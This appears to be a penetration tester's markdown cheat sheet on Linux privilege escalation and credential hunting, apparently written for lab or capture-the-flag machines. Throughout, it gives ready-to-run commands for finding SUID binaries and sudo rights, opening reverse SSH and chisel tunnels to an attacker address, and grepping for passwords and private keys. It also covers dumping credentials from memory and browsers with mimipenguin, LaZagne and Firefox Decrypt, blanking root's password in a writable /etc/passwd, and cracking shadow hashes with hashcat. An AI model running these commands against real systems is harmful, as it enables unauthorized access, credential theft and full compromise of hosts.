# PRIVILEGE ESCALATION
## Basic

###
- `id` Check groups

### Common Files to test/retrive:
- `/etc/passwd` Users 
- `/var/www/` Folder that contains website code
- `/etc/nginx/sites-available/` Folder that contains nginx configs
- `/etc/nginx/sites-available/default` nginx Vhosts
- `/etc/apache2/sites-enabled/` Folder that contains apache2 configs
- `/etc/apache2/sites-enabled/000-default.conf` apache2 Vhosts
- `/wp-config.php` Wordpress config

### Files
- `find / -group sysadmin -writable -ls 2>/dev/null | grep -v '/proc| /run |/sys'`
- `grep --color=auto -rnw '.' -ie password= --color=always 2>/dev/null`
grep --color=auto -rnw '.' -ie '$compares' --color=always 2>/dev/null
grep -r -h "pass" -v /var/www/html/CuteNews/cdata/users/ | base64 -d
`grep -r -h -v "php" /var/www/html/CuteNews/cdata/users/ | base64 -d | sed "s/}}/}}\n/g"`

## [GTFO BINS](https://gtfobins.github.io/)
### SUDO:
- `sudo -l`

### SUID:
- `find / -type f -perm -04000 -ls 2>/dev/null`
- `find / -perm -4000 2>/dev/null`
- `find / -group staff 2>/dev/null`
- `find / -type f -user svc_acc 2>/dev/null`

### CAPABILITIES:
- `getcap -r / 2>/dev/null`

### PATH:

### Sudo Version:
- `sudo -V`

## LATERAL MOVEMENT
We will try to gain shell as another user. We can check home directory and /etc/passwd to check how many users exists.

### PORT FORWARDING:
#### CHECK OPEN PORTS
- `sudo netstat -tulpn | grep LISTEN`

#### SSH TUNNEL:
##### Remote machine:
- `ssh -N -f -R 3000:localhost:3000 -R 8001:localhost:8001 kali@10.10.14.119 -p 2222`

##### Local machine:
```
sudo nano /etc/ssh/sshd_config
#port 22 to port 2222
sudo service ssh start
```

```
9001 on my local machine now forwards to remote machine port 80
ssh -L 9001:localhost:80 daniel@10.10.11.136
```

```
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
ssh -L 9001:10.10.11.136:80 daniel@10.10.11.136
```
#### CHISEL:

`lsof -i:8080` Find PID to kill

##### Local machine:
`chisel server --socks5 --reverse`

##### Remote machine:
remote machine port 8000 that is locally only now forwards to 8000 on my local machine

`./chisel client --fingerprint Xs1Q7+QLIIs5kSWcfu9+Gzvk6t2J+HE7r4kNDCGeuAM= 10.10.14.5:8080 R:3306:127.0.0.1:3306`


## Credential Hunting in Linux
Hunting for credentials is one of the first steps once we have access to the system. These low-hanging fruits can give us elevated privileges within seconds or minutes. Among other things, this is part of the local privilege escalation process that we will cover here. However, it is important to note here that we are far from covering all possible situations and therefore focus on the different approaches.

We can imagine that we have successfully gained access to a system via a vulnerable web application and have therefore obtained a reverse shell, for example. Therefore, to escalate our privileges most efficiently, we can search for passwords or even whole credentials that we can use to log in to our target. There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:

Files 	History 	Memory 	Key-Rings
Configs 	Logs 	Cache 	Browser stored credentials
Databases 	Command-line History 	In-memory Processing 	
Notes 			
Scripts 			
Source codes 			
Cronjobs 			
SSH Keys 	

Enumerating all these categories will allow us to increase the probability of successfully finding out with some ease credentials of existing users on the system. There are countless different situations in which we will always see different results. Therefore, we should adapt our approach to the circumstances of the environment and keep the big picture in mind. Above all, it is crucial to keep in mind how the system works, its focus, what purpose it exists for, and what role it plays in the business logic and the overall network. For example, suppose it is an isolated database server. In that case, we will not necessarily find normal users there since it is a sensitive interface in the management of data to which only a few people are granted access.


### Files
One core principle of Linux is that everything is a file. Therefore, it is crucial to keep this concept in mind and search, find and filter the appropriate files according to our requirements. We should look for, find, and inspect several categories of files one by one. These categories are the following:

Configuration files 	Databases 	Notes
Scripts 	Cronjobs 	SSH keys

Configuration files are the core of the functionality of services on Linux distributions. Often they even contain credentials that we will be able to read. Their insight also allows us to understand how the service works and its requirements precisely. Usually, the configuration files are marked with the following three file extensions (.config, .conf, .cnf). However, these configuration files or the associated extension files can be renamed, which means that these file extensions are not necessarily required. Furthermore, even when recompiling a service, the required filename for the basic configuration can be changed, which would result in the same effect. However, this is a rare case that we will not encounter often, but this possibility should not be left out of our search.

The most crucial part of any system enumeration is to obtain an overview of it. Therefore, the first step should be to find all possible configuration files on the system, which we can then examine and analyze individually in more detail. There are many methods to find these configuration files, and with the following method, we will see we have reduced our search to these three file extensions.

### Configuration Files
- `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done`

Optionally, we can save the result in a text file and use it to examine the individual files one after the other. Another option is to run the scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (user, password, pass) in each file with the file extension .cnf.

#### Credentials in Configuration Files
- `for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done`

We can apply this simple search to the other file extensions as well. Additionally, we can apply this search type to databases stored in files with different file extensions, and we can then read those.

### Databases
`for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done`

Depending on the environment we are in and the purpose of the host we are on, we can often find notes about specific processes on the system. These often include lists of many different access points or even their credentials. However, it is often challenging to find notes right away if stored somewhere on the system and not on the desktop or in its subfolders. This is because they can be named anything and do not have to have a specific file extension, such as .txt. Therefore, in this case, we need to search for files including the .txt file extension and files that have no file extension at all.

### Notes
- `find /home/* -type f -name "*.txt" -o ! -name "*.*"`

Scripts are files that often contain highly sensitive information and processes. Among other things, these also contain credentials that are necessary to be able to call up and execute the processes automatically. Otherwise, the administrator or developer would have to enter the corresponding password each time the script or the compiled program is called.

### Scripts
- `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done`

Cronjobs are independent execution of commands, programs, scripts. These are divided into the system-wide area (/etc/crontab) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (/etc/cron.daily, /etc/cron.hourly, /etc/cron.monthly, /etc/cron.weekly). The scripts and files used by cron can also be found in /etc/cron.d/ for Debian-based distributions.

### Cronjobs
- `cat /etc/crontab`
- `ls -la /etc/cron.*/`


### SSH Keys
SSH keys can be considered "access cards" for the SSH protocol used for the public key authentication mechanism. A file is generated for the client (Private key) and a corresponding one for the server (Public key). However, these are not the same, so knowing the public key is insufficient to find a private key. The public key can verify signatures generated by the private SSH key and thus enables automatic login to the server. Even if unauthorized persons get hold of the public key, it is almost impossible to calculate the matching private one from it. When connecting to the server using the private SSH key, the server checks whether the private key is valid and lets the client log in accordingly. Thus, passwords are no longer needed to connect via SSH.

Since the SSH keys can be named arbitrarily, we cannot search them for specific names. However, their format allows us to identify them uniquely because, whether public key or private key, both have unique first lines to distinguish them.

### SSH Private Keys
- `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"`

### SSH Public Keys
- `grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"`

### History
All history files provide crucial information about the current and past/historical course of processes. We are interested in the files that store users' command history and the logs that store information about system processes.

In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in .bash_history. Nevertheless, other files like .bashrc or .bash_profile can contain important information.
Bash History

#### Bash History
- `tail -n5 /home/*/.bash*`

An essential concept of Linux systems is log files that are stored in text files. Many programs, especially all services and the system itself, write such files. In them, we find system errors, detect problems regarding services or follow what the system is doing in the background. The entirety of log files can be divided into four categories:
Application Logs 	Event Logs 	Service Logs 	System Logs

Many different logs exist on the system. These can vary depending on the applications installed, but here are some of the most important ones:

Log File                | Description
----------------------- | ------------------------------------------------
/var/log/messages       | Generic system activity logs.
/var/log/syslog         | Generic system activity logs.
/var/log/auth.log       | (Debian) All authentication related logs.
/var/log/secure         | (RedHat/CentOS) All authentication related logs.
/var/log/boot.log      | Booting information.
/var/log/dmesg          | Hardware and drivers related information and logs.
/var/log/kern.log       | Kernel related warnings, errors and logs.
/var/log/faillog        | Failed login attempts.
/var/log/cron           | Information related to cron jobs.
/var/log/mail.log       | All mail server related logs.
/var/log/httpd          | All Apache related logs.
/var/log/mysqld.log     | All MySQL server related logs.

Covering the analysis of these log files in detail would be inefficient in this case. So at this point, we should familiarize ourselves with the individual logs, first examining them manually and understanding their formats. However, here are some strings we can use to find interesting content in the logs:

- `for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done`

### Memory and Cache
Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. For example, it may be the system-required credentials for the logged-in users. Another example is the credentials stored in the browsers, which can also be read. In order to retrieve this type of information from Linux distributions, there is a tool called mimipenguin that makes the whole process easier. However, this tool requires administrator/root permissions.

#### Memory - Mimipenguin
- `sudo python3 mimipenguin.py`
- `sudo bash mimipenguin.sh`

An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is LaZagne. This tool allows us to access far more resources and extract the credentials. The passwords and hashes we can obtain come from the following sources but are not limited to:

| Wifi         | Wpa_supplicant | Libsecret  | Kwallet     |
|--------------|----------------|------------|-------------|
| Chromium-based | CLI          | Mozilla    | Thunderbird |
| Git          | Env_variable   | Grub       | Fstab       |
| AWS          | Filezilla      | Gftp       | SSH         |
| Apache       | Shadow         | Docker     | KeePass     |
| Mimipy       | Sessions       | Keyrings   |             |

For example, Keyrings are used for secure storage and management of passwords on Linux distributions. Passwords are stored encrypted and protected with a master password. It is an OS-based password manager, which we will discuss later in another section. This way, we do not need to remember every single password and can save repeated password entries.

#### Memory - LaZagne
- `sudo python2.7 laZagne.py all`

### Browsers
Browsers store the passwords saved by the user in an encrypted form locally on the system to be reused. For example, the Mozilla Firefox browser stores the credentials encrypted in a hidden folder for the respective user. These often include the associated field names, URLs, and other valuable information.

For example, when we store credentials for a web page in the Firefox browser, they are encrypted and stored in logins.json on the system. However, this does not mean that they are safe there. Many employees store such login data in their browser without suspecting that it can easily be decrypted and used against the company.

#### Firefox Stored Credentials
- `ls -l .mozilla/firefox/ | grep default`
- `cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .`

The tool Firefox Decrypt is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, Firefox Decrypt 0.7.0 with Python 2 must be used.

#### Decrypting Firefox Credentials
- `python3.9 firefox_decrypt.py`

Alternatively, LaZagne can also return results if the user has used the supported browser.

#### Browsers - LaZagne
- `python3 laZagne.py browsers`

## Passwd, Shadow & Opasswd
Linux-based distributions can use many different authentication mechanisms. One of the most commonly used and standard mechanisms is Pluggable Authentication Modules (PAM). The modules used for this are called pam_unix.so or pam_unix2.so and are located in /usr/lib/x86_x64-linux-gnu/security/ in Debian based distributions. These modules manage user information, authentication, sessions, current passwords, and old passwords. For example, if we want to change the password of our account on the Linux system with passwd, PAM is called, which takes the appropriate precautions and stores and handles the information accordingly.

The pam_unix.so standard module for management uses standardized API calls from the system libraries and files to update the account information. The standard files that are read, managed, and updated are /etc/passwd and /etc/shadow. PAM also has many other service modules, such as LDAP, mount, or Kerberos.

### Passwd File
The /etc/passwd file contains information about every existing user on the system and can be read by all users and services. Each entry in the /etc/passwd file identifies a user on the system. Each entry has seven fields containing a form of a database with information about the particular user, where a colon (:) separates the information. Accordingly, such an entry may look something like this:

Passwd Format
cry0l1t3 	: 	x 	: 	1000 	: 	1000 	: 	cry0l1t3,,, 	: 	/home/cry0l1t3 	: 	/bin/bash
Login name 		Password info 		UID 		GUID 		Full name/comments 		Home directory 		Shell

The most interesting field for us is the Password information field in this section because there can be different entries here. One of the rarest cases that we may find only on very old systems is the hash of the encrypted password in this field. Modern systems have the hash values stored in the /etc/shadow file, which we will come back to later. Nevertheless, /etc/passwd is readable system-wide, giving attackers the possibility to crack the passwords if hashes are stored here.

Usually, we find the value x in this field, which means that the passwords are stored in an encrypted form in the /etc/shadow file. However, it can also be that the /etc/passwd file is writeable by mistake. This would allow us to clear this field for the user root so that the password info field is empty. This will cause the system not to send a password prompt when a user tries to log in as root.

#### Editing /etc/passwd - Before
root:x:0:0:root:/root:/bin/bash

#### Editing /etc/passwd - After
root::0:0:root:/root:/bin/bash

Even though the cases shown will rarely occur, we should still pay attention and watch for security gaps because there are applications that require us to set specific permissions for entire folders. If the administrator has little experience with Linux or the applications and their dependencies, the administrator may give write permissions to the /etc directory and forget to correct them.

### Shadow File
Since reading the password hash values can put the entire system in danger, the file /etc/shadow was developed, which has a similar format to /etc/passwd but is only responsible for passwords and their management. It contains all the password information for the created users. For example, if there is no entry in the /etc/shadow file for a user in /etc/passwd, the user is considered invalid. The /etc/shadow file is also only readable by users who have administrator rights. The format of this file is divided into nine fields:

#### Shadow Format
cry0l1t3 	: 	$6$wBRzy$...SNIP...x9cDWUxW1 	: 	18937 	: 	0 	: 	99999 	: 	7 	: 	: 	:
Username 		Encrypted password 		Last PW change 		Min. PW age 		Max. PW age 		Warning period 	Inactivity period 	Expiration date 	Unused

If the password field contains a character, such as ! or *, the user cannot log in with a Unix password. However, other authentication methods for logging in, such as Kerberos or key-based authentication, can still be used. The same case applies if the encrypted password field is empty. This means that no password is required for the login. However, it can lead to specific programs denying access to functions. The encrypted password also has a particular format by which we can also find out some information:

    - $<type>$<salt>$<hashed>

As we can see here, the encrypted passwords are divided into three parts. The types of encryption allow us to distinguish between the following:
Algorithm Types

    - `$1$-MD5`
    - `$2a$ -Blowfish`
    - `$2y$ - Eksblowfish`
    - `$5$ - SHA-256`
    - `$6$ - SHA-512`

By default, the SHA-512 ($6$) encryption method is used on the latest Linux distributions. We will also find the other encryption methods that we can then try to crack on older systems. We will discuss how the cracking works in a bit.

### Opasswd
The PAM library (pam_unix.so) can prevent reusing old passwords. The file where old passwords are stored is the /etc/security/opasswd. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.

- `cat /etc/security/opasswd`
- `cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1`

Looking at the contents of this file, we can see that it contains several entries for the user cry0l1t3, separated by a comma (,). Another critical point to pay attention to is the hashing type that has been used. This is because the MD5 ($1$) algorithm is much easier to crack than SHA-512. This is especially important for identifying old passwords and maybe even their pattern because they are often used across several services or applications. We increase the probability of guessing the correct password many times over based on its pattern.

### Cracking Linux Credentials
Once we have collected some hashes, we can try to crack them in different ways to get the passwords in cleartext.

#### Unshadow
```
sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak 
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

#### Hashcat - Cracking Unshadowed Hashes
- `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked`

#### Hashcat - Cracking MD5 Hashes
- `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`